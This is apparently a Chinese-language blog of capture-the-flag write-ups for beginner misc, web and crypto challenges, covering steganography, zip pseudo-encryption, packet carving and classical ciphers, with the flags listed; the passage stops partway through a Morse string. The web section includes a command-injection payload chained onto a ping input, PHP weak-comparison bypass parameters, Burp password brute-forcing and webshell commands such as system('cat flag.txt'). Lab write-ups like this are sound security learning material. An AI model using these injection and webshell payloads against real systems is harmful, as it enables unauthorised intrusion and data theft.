<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">474946</span><br></pre></td></tr></table></figure>
<p>表示这是一个gif文件。更改后缀名后放入photoshop中，得到两个图层。</p>
<p>分别将两个图层的空白图片放入stegsolve，得到二维码。放入photoshop合成二维码并补充三个角，扫码后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
<h3 id="rar头部构成"><a href="#rar头部构成" class="headerlink" title="rar头部构成"></a>rar头部构成</h3><p>每个数据块结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEAD_CRC：校验码，2字节</span><br><span class="line">HEAD_TYPE：块类型，1字节</span><br><span class="line">HEAD_FLAGS：块标记，2字节</span><br><span class="line">最后两字节：块大小</span><br></pre></td></tr></table></figure>
<p>整个RAR文件数据块构成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标记块：HEAD_TYPE&#x3D;0x72</span><br><span class="line">压缩文件头：HEAD_TYPE&#x3D;0x74</span><br><span class="line">文件头：HEAD_TYPE&#x3D;0x74</span><br></pre></td></tr></table></figure>
<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>工具：winhex</p>
<p>知识点：zip伪加密，base64隐写</p>
<p>首先要用winhex，修改zip的压缩源文件数据区全局加密处的字节</p>
<p>得到一个文件stego.txt。结合题目提示，对其进行base64解码，并未得到期望的结果。</p>
<p>查阅wp可知考察base64隐写。base64隐写不等于base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import msvcrt</span><br><span class="line">import time</span><br><span class="line">b64chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line">with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:</span><br><span class="line">    bin_str &#x3D; &#39;&#39;</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        # 去除头尾的换行符</span><br><span class="line">        stegb64 &#x3D; str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">        # 基于base64解码又编码，达到去除隐写的符号的目的</span><br><span class="line">        row64 &#x3D; str(base64.b64encode(base64.b64decode(stegb64)),&quot;utf-8&quot;)</span><br><span class="line">        # 基于base64的隐写，都在最后一个字符上体现。因此算一下两个字符串最后一个字符的差值</span><br><span class="line">        offset &#x3D; abs(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]) - b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        print(offset)</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;))</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1])</span><br><span class="line">        #print(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        #print(b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        # 等号的数量*2等于最后返回字符串的长度</span><br><span class="line">        equalnum &#x3D; stegb64.count(&#39;&#x3D;&#39;)</span><br><span class="line">        if equalnum:</span><br><span class="line">            bin_str +&#x3D; bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">        print(bin(offset))</span><br><span class="line">        print(bin(offset)[2:])</span><br><span class="line">        # 右对齐后，在头部填充0</span><br><span class="line">        print(bin(offset)[2:].zfill(equalnum * 2))</span><br><span class="line">        # 8个bit转换为一个字符</span><br><span class="line">        print(&#39;&#39;.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)]))</span><br><span class="line">        # time.sleep(3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="zip的伪加密"><a href="#zip的伪加密" class="headerlink" title="zip的伪加密"></a>zip的伪加密</h3><p>zip由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志，根据三个区域的不同，区分zip是非加密、伪加密还是加密的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区： </span><br><span class="line">50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密） 头文件标记后2bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">00 00：扩展记录长度 </span><br><span class="line">6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line">压缩源文件目录区： </span><br><span class="line"></span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"></span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line"></span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes</span><br><span class="line">08 00：压缩方式 </span><br><span class="line">5A 7E：最后修改文件时间 </span><br><span class="line">F7 46：最后修改文件日期 </span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">19 00 00 00：压缩后尺寸（25） </span><br><span class="line">17 00 00 00：未压缩尺寸（23） </span><br><span class="line">07 00：文件名长度 </span><br><span class="line">24 00：扩展字段长度 </span><br><span class="line">00 00：文件注释长度 </span><br><span class="line">00 00：磁盘开始号 </span><br><span class="line">00 00：内部文件属性 </span><br><span class="line">20 00 00 00：外部文件属性 </span><br><span class="line"></span><br><span class="line">00 00 00 00：局部头部偏移量</span><br><span class="line"></span><br><span class="line">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line">压缩源文件目录结束标志： </span><br><span class="line">50 4B 05 06：目录结束标记 </span><br><span class="line">00 00：当前磁盘编号 </span><br><span class="line">00 00：目录区开始磁盘编号 </span><br><span class="line">01 00：本磁盘上纪录总数 </span><br><span class="line">01 00：目录区中纪录总数 </span><br><span class="line">59 00 00 00：目录区尺寸大小 </span><br><span class="line"></span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line"></span><br><span class="line">00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">无加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</span><br><span class="line"></span><br><span class="line">假加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00</span><br><span class="line"></span><br><span class="line">真加密</span><br><span class="line">压缩源文件数据区的全局加密应当为09 00 </span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00 </span><br></pre></td></tr></table></figure>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>原本一个字符使用8bit表示，使用base64编码后改为用6bit表示，不能除尽的部分补0</p>
<h3 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查base64编码后面有几个等于号</span><br><span class="line">把字符串按照base64表转换成4*6的倍数位数二进制</span><br><span class="line">删除等于号的个数*8的bit</span><br><span class="line">按照6个bit一组转成字符</span><br></pre></td></tr></table></figure>
<h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基于base64解码时尾部存在一定数量的bit不会被转义的情况，可以在此处植入想要隐写的字符</span><br></pre></td></tr></table></figure>
<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>这题没看题解自己做的，感动哭了</p>
<p>首先根据提示，这是一个linux系统光盘文件。放入centos中，使用file命令查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file f1fc23f5c743425d9e0073887c846d23</span><br><span class="line"></span><br><span class="line">Linux rev 1.0 ext3 filesystem data, UUID&#x3D;cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>
<p>网上查阅如何使用ext3文件系统数据，使用mount命令挂载。注意要在root用户权限下使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop f1fc23f5c743425d9e0073887c846d23 &#x2F;mnt</span><br><span class="line"># -o loop提供了一个虚拟磁盘，&#x2F;mnt是挂载的目录</span><br></pre></td></tr></table></figure>
<p>进入/mnt，随便搜搜flag相关字，发现在flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;O7avZhikgKgbF&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<p>查看flag.txt中的内容，根据字符串其后的等号判断为base64。解码后得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure>
<p>网上还有一种用winhex的做法</p>
<h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>工具：kali的foremost，winhex，wireshark</p>
<p>双击pcapng文件，通过搜索关键字“flag.txt”可知，传输了flag.txt文件</p>
<p>通过kali下的foremost分离出传输flag.txt的压缩包。</p>
<p>通过winhex，发现压缩包是真实加密的，无法通过更改十六进制字符直接获取flag.txt</p>
<p>再次打开pcapng文件，大量的分析tcp流，查找可能相关的的文件。发现6666.jpg文件，还原出6666.jpg文件。</p>
<p>jpg文件头是FFD8FF，文件尾是FFD9。将包含头尾的16进制字符串复制到winhex中，输出一个jpg文件。打开jpg文件，得到压缩包的解压密码</p>
<p>最后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure>
<h3 id="各类文件的标志头"><a href="#各类文件的标志头" class="headerlink" title="各类文件的标志头"></a>各类文件的标志头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jpg：FFD8FF</span><br><span class="line">png：89504E47</span><br><span class="line">gif：47494638</span><br></pre></td></tr></table></figure>


<h1 id="攻防世界-web-初级"><a href="#攻防世界-web-初级" class="headerlink" title="攻防世界 web 初级"></a>攻防世界 web 初级</h1><h2 id="view-souce"><a href="#view-souce" class="headerlink" title="view_souce"></a>view_souce</h2><p>按F12，看到注释源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;ffd40408d5b1b8c2dad9aab623dd93ef&#125;</span><br></pre></td></tr></table></figure>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>先用御剑或者dirsearch扫描一下给出的网站</p>
<p>得到目录下存在robots.txt文件</p>
<p>访问该文件，网页展示内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: f1ag_1s_h3re.php</span><br></pre></td></tr></table></figure>
<p>访问f1ag_1s_h3re.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;57752958f46d76651078942ee34b88ba&#125;</span><br></pre></td></tr></table></figure>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>同理，用御剑扫一下后台，存在index.php.bak文件</p>
<p>访问这个文件，自动下载文件</p>
<p>使用sublime text打开文件，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</span><br></pre></td></tr></table></figure>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>所需工具：firefox</p>
<p>可选工具：burp，wireshark</p>
<p>先打开网页，根据题目提示，在firefox按F12查看cookie</p>
<p>根据提示访问cookie.php</p>
<p>根据提示查看http response，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;5c1980e2f03a088816f306f7680d5458&#125;</span><br></pre></td></tr></table></figure>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>工具：firefox</p>
<p>打开网页，显示按钮不能按</p>
<p>使用firefox，按F12检查网页源码，把button处的disabled去掉，即可提交</p>
<p>提交后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;a8efb264c88f7cba483ed431888a1d32&#125;</span><br></pre></td></tr></table></figure>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>目的：爆破弱密码</p>
<p>工具：burp</p>
<p>proxy拦截提交的请求，将请求send to intruder，在intruder的position中更改数据包，使得提交的指定字段为变量，在intruder的payload中载入字典，点击attack</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4b4dda09ed661c8976f965b0681de325&#125;</span><br></pre></td></tr></table></figure>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><p>输入localhost，看到请求为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<p>尝试注入语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; select database(); #</span><br></pre></td></tr></table></figure>
<p>得到请求为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target:&quot;+select+database();+#</span><br></pre></td></tr></table></figure>
<p>说明不能注入</p>
<p>参考writeup，直接在命令行执行的ping，可以执行其他语句。又flag一般放在txt中，输入下列语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find &#x2F; -name &quot;*.txt&quot; | grep flag</span><br></pre></td></tr></table></figure>
<p>看到/home/flag.txt</p>
<p>查看文件内容得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;168a646a5815f5b2f0e42e56812943d5&#125;</span><br></pre></td></tr></table></figure>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>需要知识点：php的弱类型比较</p>
<p>需要工具：直接在浏览器提交就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写法1：?a&#x3D;&#39;0&#39;&amp;b&#x3D;1235a # 使a为字符串，b为非数字的一种变量</span><br><span class="line">写法2：?a&#x3D;0a&amp;b&#x3D;12345%00 # %00表示阶段，可以使b不为数字或数字字符串</span><br></pre></td></tr></table></figure>


<h3 id="php的弱类型比较"><a href="#php的弱类型比较" class="headerlink" title="php的弱类型比较"></a>php的弱类型比较</h3><p>php有两种判断相等的方法，==，===</p>
<p>==会将两边值进行强制类型转换后在判断</p>
<p>===同时判断类型和值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line">if(&quot;1admin&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;true</span><br><span class="line">if(&quot;admin1&quot;&#x3D;&#x3D;1)&#x2F;&#x2F;false</span><br><span class="line">if(&quot;0e12324&quot;&#x3D;&#x3D;&quot;0e1324&quot;)&#x2F;&#x2F;true，当做科学技术法，都是0</span><br></pre></td></tr></table></figure>
<p>get_post</p>
<p>工具：firefox的hackbar插件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;f5206ff77800e22928b4d81206e083e5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>工具：burpsuite</p>
<p>在burp的proxy里，把包拦下来，按照提示加入这两条就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure>
<p>得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;2db9b3a38c581792bea6f015e6bdfdc8&#125;</span><br></pre></td></tr></table></figure>
<h3 id="XFF和Referer"><a href="#XFF和Referer" class="headerlink" title="XFF和Referer"></a>XFF和Referer</h3><p>X-Forwarded-For：浏览器访问服务器时，使用的IP</p>
<p>Referer：浏览器告诉服务器，自己从哪个IP跳转来的</p>
<p>web_shell</p>
<p>考察：php一句话木马，php执行shell命令</p>
<p>工具：中国蚁剑，中国菜刀，hackbar</p>
<p>做法1：中国蚁剑or中国菜刀</p>
<p>菜刀可以绕过认证部分，直接拿到webshell权限，之后查找flag即可</p>
<p>做法2：hackbar</p>
<p>在post data中写入 以下语句</p>
<p>首先查找当前目录文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
<p>写入以下任意一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;passthru(&quot;cat flag.txt&quot;);</span><br><span class="line">shell&#x3D;system(&quot;cat flag.txt&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="php执行shell命令"><a href="#php执行shell命令" class="headerlink" title="php执行shell命令"></a>php执行shell命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string system ( string $command [, int &amp;$return_var ] )</span><br><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>考察：js阅读，转码</p>
<p>阅读js源码，发现dechiffre不管输入什么，都会根据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65</span><br></pre></td></tr></table></figure>
<p>返回一个值。ASCII码范围为0~127，猜测这几个值为字符的ASCII码表示</p>
<p>代码里有一段十六进制的长字符串，猜测为答案</p>
<p>先把长字符串转换为十进制，再转换为字符，得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberpeace&#123;786OsErtk12&#125;</span><br></pre></td></tr></table></figure>


<h1 id="攻防世界-crypto初级"><a href="#攻防世界-crypto初级" class="headerlink" title="攻防世界 crypto初级"></a>攻防世界 crypto初级</h1><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>考察：凯撒密码</p>
<p>根据题目提示，将得到字符串进行凯撒密码的解密即可</p>
<p>提供的字符串为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure>
<p>oknqdbqmoq部分解密后应该就是cyberspace，利用这一点算出加解密时需要的步数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>考察：摩斯密码</p>
<p>根据题目提示，将01字符串转换为摩斯密码。其中1为-，0为.，空格为/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;---&#x2F;.-.&#x2F;...&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;..&#x2F;...&#x2F;...&#x2F;---&#x2F;..&#x2F;-.&#x2F;-&#x2F;.&#x2F;.-.&#x2F;.&#x2F;...&#x2F;-&#x2F;..&#x2F;-.&#x2F;--.</span><br></pre></td></tr></table></figure>
<p>使用在线转换器得到答案。注意若答案为大写，需要转换为小写后提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;morsecodeissointeresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><p>考察：云影密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;WELLDOWN&#125;</span><br></pre></td></tr></table></figure>
<h3 id="云影密码"><a href="#云影密码" class="headerlink" title="云影密码"></a>云影密码</h3><p>只有84210五种数字的字符串，以0位分隔符，数字相加后转换为对应的大写英文字母。如8421=15=O</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure>
<h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>考察：Railfence-cipher</p>
<p>根据题目提示，可能是栅栏密码。尝试后并未得出有效答案</p>
<p>根据wp，为一种变形的栅栏密码Railfence-ciper</p>
<p>代码写起来挺啰嗦的，找一个在线的解码器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br><span class="line">cyberpeace&#123;railfence_cipher_gogogo&#125;</span><br></pre></td></tr></table></figure>
<h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><p>考察：Morse，培根密码</p>
<p>打开附件，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;.-&#x2F;-.--&#x2F;..--.-&#x2F;-...&#x2F;.&#x2F;..--.-&#x2F;....&#x2F;.-&#x2F;...-&#x2F;.&#x2F;..--.-&#x2F;.-&#x2F;-.&#x2F;---&#x2F;-&#x2F;....&#x2F;.&#x2F;.-.&#x2F;..--.-&#x2F;-..&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;....&#x2F;....&#x2F;....&#x2F;....&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...